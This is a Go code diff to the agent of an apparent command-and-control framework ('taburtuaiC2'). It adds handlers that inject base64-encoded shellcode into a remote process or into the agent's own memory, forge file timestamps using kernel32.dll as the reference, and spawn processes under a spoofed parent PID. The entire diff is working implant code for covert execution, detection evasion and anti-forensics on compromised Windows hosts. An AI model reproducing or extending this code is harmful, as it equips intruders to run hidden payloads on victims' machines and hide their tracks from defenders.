@@ -9,6 +9,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/mjopsec/taburtuaiC2/pkg/types"
 )
@@ -57,6 +58,12 @@ func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
 		handleADSExec(cmd, result)
 	case "lolbin_fetch":
 		handleLOLBinFetch(cmd, result)
+	case "inject_remote":
+		handleInjectRemote(cmd, result)
+	case "inject_self":
+		handleInjectSelf(cmd, result)
+	case "timestomp":
+		handleTimestomp(cmd, result)
 	case "execute":
 		fallthrough
 	default:
@@ -195,6 +202,29 @@ func handleProcessStart(cmd *types.Command, result *types.CommandResult) {
 		return
 	}
 
+	// PPID spoofing: if a spoof parent is requested, use Windows API
+	if cmd.SpoofParentPID > 0 || cmd.SpoofParentName != "" {
+		parentPID := cmd.SpoofParentPID
+		if parentPID == 0 {
+			var err error
+			parentPID, err = pidByName(cmd.SpoofParentName)
+			if err != nil {
+				result.Error = fmt.Sprintf("PPID spoof: %v", err)
+				result.ExitCode = 1
+				return
+			}
+		}
+		args := strings.Join(cmd.ProcessArgs, " ")
+		_, err := spawnWithPPID(cmd.ProcessPath, args, parentPID)
+		if err != nil {
+			result.Error = fmt.Sprintf("PPID spoof spawn: %v", err)
+			result.ExitCode = 1
+			return
+		}
+		result.Output = fmt.Sprintf("[+] Spawned %s with spoofed PPID %d", cmd.ProcessPath, parentPID)
+		return
+	}
+
 	execCmd := exec.Command(cmd.ProcessPath, cmd.ProcessArgs...)
 	output, err := execCmd.CombinedOutput()
 	if err != nil {
@@ -256,6 +286,90 @@ func handleLOLBinFetch(cmd *types.Command, result *types.CommandResult) {
 		return
 	}
 	result.Output = fmt.Sprintf("[+] Fetched via %s → %s", method, cmd.DestinationPath)
+}
+
+// handleInjectRemote injects base64-encoded shellcode into a remote process.
+func handleInjectRemote(cmd *types.Command, result *types.CommandResult) {
+	if cmd.ShellcodeB64 == "" {
+		result.Error = "inject_remote requires shellcode_b64"
+		result.ExitCode = 1
+		return
+	}
+	if cmd.InjectPID == 0 {
+		result.Error = "inject_remote requires inject_pid"
+		result.ExitCode = 1
+		return
+	}
+	sc, err := base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
+	if err != nil {
+		result.Error = fmt.Sprintf("base64 decode: %v", err)
+		result.ExitCode = 1
+		return
+	}
+	method := cmd.InjectMethod
+	if method == "" {
+		method = "crt"
+	}
+	if err := injectShellcode(cmd.InjectPID, sc, method); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] Injected %d bytes into PID %d via %s", len(sc), cmd.InjectPID, method)
+}
+
+// handleInjectSelf executes base64-encoded shellcode in the agent's own process (fileless).
+func handleInjectSelf(cmd *types.Command, result *types.CommandResult) {
+	if cmd.ShellcodeB64 == "" {
+		result.Error = "inject_self requires shellcode_b64"
+		result.ExitCode = 1
+		return
+	}
+	sc, err := base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
+	if err != nil {
+		result.Error = fmt.Sprintf("base64 decode: %v", err)
+		result.ExitCode = 1
+		return
+	}
+	if err := execShellcodeSelf(sc); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] Executed %d bytes in-memory", len(sc))
+}
+
+// handleTimestomp changes file timestamps on the agent.
+func handleTimestomp(cmd *types.Command, result *types.CommandResult) {
+	if cmd.SourcePath == "" {
+		result.Error = "timestomp requires source_path (target file)"
+		result.ExitCode = 1
+		return
+	}
+	var setTime *time.Time
+	if cmd.TimestompTime != "" {
+		t, err := time.Parse(time.RFC3339, cmd.TimestompTime)
+		if err != nil {
+			result.Error = fmt.Sprintf("invalid timestomp_time (use RFC3339): %v", err)
+			result.ExitCode = 1
+			return
+		}
+		setTime = &t
+	}
+	if err := timestompFile(cmd.SourcePath, cmd.TimestompRef, setTime); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	ref := cmd.TimestompRef
+	if ref == "" && setTime == nil {
+		ref = `C:\Windows\System32\kernel32.dll`
+	}
+	if ref != "" {
+		result.Output = fmt.Sprintf("[+] Timestomped %s ← %s", cmd.SourcePath, ref)
+	} else {
+		result.Output = fmt.Sprintf("[+] Timestomped %s ← %s", cmd.SourcePath, cmd.TimestompTime)
+	}
 }
 
 func handleADSWrite(cmd *types.Command, result *types.CommandResult) {
